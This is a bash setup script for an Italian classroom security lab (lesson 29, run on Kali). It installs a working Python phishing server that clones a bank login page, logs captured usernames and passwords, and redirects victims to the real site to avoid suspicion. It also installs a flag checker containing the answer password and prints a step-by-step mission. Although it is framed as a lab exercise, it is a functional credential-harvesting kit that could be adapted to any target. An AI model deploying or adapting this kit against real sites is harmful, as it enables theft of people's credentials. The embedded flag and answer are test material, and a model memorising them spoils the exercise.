#!/usr/bin/env bash
# Lezione 29 · lato Kali · pagina di phishing didattica (tool).
# Installa un "kit" di phishing: clone del login della Banca che cattura le
# credenziali e poi rimanda al sito vero. Solo stdlib. Idempotente.
set -uo pipefail

UTENTE="${SUDO_USER:-$USER}"
HOME_UTENTE="$(getent passwd "$UTENTE" | cut -d: -f6)"
[ -z "$HOME_UTENTE" ] && HOME_UTENTE="/home/$UTENTE"
DIR="$HOME_UTENTE/lab/lezione-29"

echo "== Lezione 29 · Pagina di phishing didattica =="
mkdir -p "$DIR"

cat > "$DIR/phish.py" <<'PY'
#!/usr/bin/env python3
# phish.py - pagina civetta identica al login della Banca. Cattura le
# credenziali e rimanda al sito vero, cosi' la vittima non sospetta. Solo stdlib.
# Uso:  python3 phish.py            (ascolta su :8080)
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

REALE = "http://10.10.10.20:8080/"          # il sito vero, per il redirect
LOG = os.path.expanduser("~/lab/lezione-29/catturate.log")
CLONE = """<!doctype html><html lang="it"><head><meta charset="utf-8">
<title>Banca della Scuola - Accesso</title></head><body>
<h1>Banca della Scuola</h1><h2>Accesso clienti</h2>
<form method="post" action="/login">
<p>Utente: <input name="utente"></p>
<p>Password: <input name="password" type="password"></p>
<button>Entra</button></form>
<p style="color:gray">Area riservata. Non condividere le tue credenziali.</p>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(CLONE.encode())

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(n).decode("utf-8", "replace")
        form = parse_qs(raw)
        # registra i campi DECODIFICATI, cosi' la flag e' leggibile
        leggibile = " ".join("%s=%s" % (k, v[0]) for k, v in form.items())
        riga = "CATTURATA -> %s | %s\n" % (self.client_address[0], leggibile)
        with open(LOG, "a") as f:
            f.write(riga)
        print("[+] " + riga.strip(), flush=True)
        # rimanda al sito vero: la vittima pensa di aver solo sbagliato a digitare
        self.send_response(302)
        self.send_header("Location", REALE)
        self.end_headers()

    def log_message(self, *a):
        pass


open(LOG, "a").close()
print("[*] Pagina di phishing attiva su :8080. Le credenziali finiscono in", LOG)
ThreadingHTTPServer(("0.0.0.0", 8080), H).serve_forever()
PY
chmod +x "$DIR/phish.py"
chown -R "$UTENTE:$UTENTE" "$HOME_UTENTE/lab" 2>/dev/null || true

cat > /usr/local/bin/lab29-verifica <<'EOF'
#!/usr/bin/env bash
set -uo pipefail
if [ "${1:-}" = "Pesc3Rosso!" ] || [ "$(echo "${1:-}" | tr 'A-Z' 'a-z')" = "pesc3rosso!" ]; then
  echo "[OK] Hai pescato le credenziali della vittima con la pagina civetta!"
  echo "FLAG{credenziali_pescate}"
else
  echo "[--] No. Leggi catturate.log e prendi la password della vittima."
fi
EOF
chmod 755 /usr/local/bin/lab29-verifica

cat <<'MSG'

------------------------------------------------------------
 MISSIONE · Costruire (e capire) una pagina di phishing
------------------------------------------------------------
 Il phishing e' un sito civetta identico all'originale che cattura le
 credenziali. ATTENZIONE: si usa SOLO qui, contro il finto utente del lab.

 Cartella:  ~/lab/lezione-29

 [ ] 1  Avvia la pagina di phishing                            (avvio)
        cd ~/lab/lezione-29
        cat phish.py            # nota: cattura e poi rimanda al sito vero
        sudo python3 phish.py
        # (aprila anche in Firefox: sembra il login vero)

 [ ] 2  Aspetta che la vittima "abbocchi"                      (+40)
        # il finto utente del bersaglio invia le sue credenziali qui:
        tail -f ~/lab/lezione-29/catturate.log
        # nella riga catturata c'e' una flag

 [ ] 3  Leggi la password pescata                              (+30)
        lab29-verifica <la-password-catturata>

 Concetti:  clone del sito  cattura credenziali  redirect al sito vero
------------------------------------------------------------
MSG
